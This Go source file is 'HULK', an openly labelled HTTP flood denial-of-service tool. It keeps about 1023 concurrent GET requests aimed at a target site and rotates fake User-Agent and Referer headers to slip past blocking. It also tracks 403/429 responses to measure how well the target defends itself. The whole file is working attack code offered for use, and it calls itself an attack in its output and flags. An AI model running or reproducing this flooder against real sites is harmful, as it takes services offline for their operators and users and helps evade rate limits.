package main

import (
    "flag"        // Handles command-line flags
    "fmt"         // Handles formatted I/O
    "math/rand"  // Generates random numbers
    "net/http"   // Handles HTTP requests
    "net/url"    // Parses URLs
    "os"         // Handles OS-level functions
    "os/signal"  // Handles OS signals
    "strings"    // Provides string manipulation functions
    "sync/atomic" // Provides atomic operations for concurrency
    "syscall"    // Handles system calls
)

// Custom type for handling multiple header flags
type arrayFlags []string

// String representation of arrayFlags
func (i *arrayFlags) String() string {
    return "[" + strings.Join(*i, ",") + "]"
}

// Appends new value to arrayFlags
func (i *arrayFlags) Set(value string) error {
    *i = append(*i, value)
    return nil
}

// Version constant
const __version__ = "1.0.1"

// Enum-like constants to define various outcomes of HTTP requests
const (
    callGotOk uint8 = iota
    callExitOnErr
    callExitOnTooManyFiles
    callBlocked
    targetComplete
)

// Global variables
var (
    safe bool // Flag to indicate if the attack should auto-shutdown
    
    // List of referer headers for request obfuscation
    headersReferers = []string{
        "http://www.google.com/?q=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://www.bing.com/search?q=",
        "http://search.yahoo.com/search?p=",
    }
    
    // List of user-agent headers for request obfuscation
    headersUseragents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    }
    
    cur int32 // Counter for the number of concurrent requests
)

func main() {
    var (
        version bool    // Flag for printing the version
        site string     // Target site URL
        headers arrayFlags // Custom headers to be added to requests
    )

    // Defining command-line flags
    flag.BoolVar(&version, "version", false, "print version and exit")
    flag.BoolVar(&safe, "safe", false, "Autoshut after DoS attack")
    flag.StringVar(&site, "site", "http://localhost", "Destination site")
    flag.Var(&headers, "header", "Add headers to the request")
    flag.Parse()

    // Parsing the provided site URL
    u, err := url.Parse(site)
    if err != nil {
        fmt.Println("Error parsing URL parameter")
        os.Exit(1)
    }

    // If version flag is set, print version and exit
    if version {
        fmt.Println("Hulk", __version__)
        os.Exit(0)
    }

    // Start the attack in a separate goroutine
    go func() {
        fmt.Println("-- HULK Attack Started --\n        Go!\n")
        ss := make(chan uint8, 8) // Channel for communication between goroutines
        var errCount, sent, blocked int32

        fmt.Println("In use      |  Resp OK |  Got err  |  Blocked")
        for {
            if atomic.LoadInt32(&cur) < 1023 {
                go httpcall(site, u.Host, headers, ss) // Start a new HTTP request
            }
            if sent%10 == 0 {
                fmt.Printf("\r%6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
            }
            switch <-ss {
            case callExitOnErr:
                atomic.AddInt32(&cur, -1)
                errCount++
            case callExitOnTooManyFiles:
                atomic.AddInt32(&cur, -1)
            case callGotOk:
                sent++
            case callBlocked:
                blocked++
            case targetComplete:
                sent++
                fmt.Printf("\r%-6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
                fmt.Println("\r-- HULK Attack Finished --\n")
                os.Exit(0)
            }
        }
    }()

    // Handle termination signals (Ctrl+C, kill, etc.)
    ctlc := make(chan os.Signal)
    signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
    <-ctlc
    fmt.Println("\r\n-- Interrupted by user --\n")
}

// Function to make an HTTP request to the target site
func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)
    client := &http.Client{}

    req, err := http.NewRequest("GET", url, nil)
    if err != nil {
        s <- callExitOnErr
        return
    }

    // Set random User-Agent and Referer headers
    req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
    req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])

    resp, err := client.Do(req)
    if err != nil {
        s <- callExitOnErr
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode == 403 || resp.StatusCode == 429 {
        s <- callBlocked
        return
    }
    s <- callGotOk
}
